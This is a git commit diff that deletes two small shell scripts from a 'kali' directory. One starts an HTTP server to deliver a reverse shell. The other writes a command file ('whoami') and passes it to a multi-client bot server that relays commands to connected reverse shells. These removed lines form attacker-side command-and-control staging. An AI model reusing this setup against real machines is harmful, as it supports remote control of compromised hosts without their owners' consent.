5ed0d555be46071446b7451c6be02c775087544e
ghostface <wseven347.devopser@gmail.com>
2025-01-26 03:32:05 -0700

    Delete kali directory

--- kali/tab-2.sh
+++
@@ -1,2 +0,0 @@
-# starting the server to download the reverse shell
-python3 -m http.server 8080
--- kali/tab-3.sh
+++
@@ -1,5 +0,0 @@
-# tab for working with the server, create a file with commands, and then send them to the reverse shell
-touch f.txt
-echo "whoami" > f.txt
-
-python3 multi-client-bot-server.py f.txt
